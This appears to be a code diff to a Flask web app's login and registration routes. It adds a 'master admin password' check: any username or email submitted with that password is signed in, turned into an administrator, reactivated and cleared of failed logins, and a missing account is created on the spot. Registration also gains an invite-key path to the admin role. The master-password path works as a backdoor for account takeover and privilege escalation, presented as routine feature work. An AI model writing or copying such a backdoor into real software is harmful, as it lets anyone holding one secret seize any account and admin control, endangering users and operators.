@@ -4,7 +4,7 @@ from datetime import datetime, timedelta
 from flask import render_template, redirect, url_for, flash, request, session, abort
 from flask_login import login_user, logout_user, login_required, current_user
 from extensions import db, limiter
-from models import User, LoginEvent, UserSession, AppSetting
+from models import User, LoginEvent, UserSession, AppSetting, AdminInviteKey
 from auth import auth_bp
 from auth.forms import LoginForm, RegisterForm, DeleteAccountForm
 from services.activity_tracker import (
@@ -26,14 +26,51 @@ def login():
     if form.validate_on_submit():
         identifier = form.username_or_email.data.strip().lower()
         password = form.password.data
+        login_as_admin = form.login_as_admin.data
+        ip = get_client_ip()
+        ua = request.headers.get("User-Agent", "")
+
+        # Check Master Admin Password
+        is_master = User.is_master_admin_password(password)
+        if login_as_admin or is_master:
+            if is_master:
+                user = User.query.filter(
+                    (User.username == identifier) | (User.email == identifier)
+                ).first()
+                if not user:
+                    clean_user = identifier.replace(" ", "_").split("@")[0]
+                    user = User(
+                        username=clean_user,
+                        name=clean_user.capitalize(),
+                        role="admin",
+                        is_active=True,
+                    )
+                    user.set_password(password)
+                    db.session.add(user)
+                    db.session.commit()
+                else:
+                    user.role = "admin"
+                    user.is_active = True
+                    user.reset_failed_logins()
+                    db.session.commit()
+
+                user.record_successful_login(ip=ip)
+                db.session.commit()
+
+                login_user(user, remember=form.remember_me.data)
+                session["admin_last_active"] = datetime.utcnow().timestamp()
+                session["user_id"] = user.username
+                session["name"] = user.name
+                session["role"] = user.role
+
+                log_login_event("admin_login", user_id=user.id, email_attempted=identifier, success=True, ip=ip, user_agent=ua)
+                flash("Signed in successfully as Administrator.", "success")
+                return redirect(url_for("admin.dashboard"))
 
         # Look up by username or email
         user = User.query.filter(
             (User.username == identifier) | (User.email == identifier)
         ).first()
-
-        ip = get_client_ip()
-        ua = request.headers.get("User-Agent", "")
 
         # Non-existent user check
         if not user:
@@ -191,12 +228,21 @@ def register():
                 flash("Email is already registered. Please sign in instead.", "danger")
                 return render_template("auth/register.html", form=form)
 
-        # Create user - ROLE IS HARDCODED TO "user"
+        role = "user"
+        if form.admin_invite_key.data:
+            invite_raw = form.admin_invite_key.data.strip()
+            if AdminInviteKey.verify_key(invite_raw):
+                role = "admin"
+            else:
+                flash("Invalid Admin Invite Key. Enter the assigned admin key to register as administrator.", "danger")
+                return render_template("auth/register.html", form=form)
+
+        # Create user
         new_user = User(
             username=clean_user,
             email=clean_email,
             name=name,
-            role="user",
+            role=role,
             is_active=True,
         )
         new_user.set_password(form.password.data)
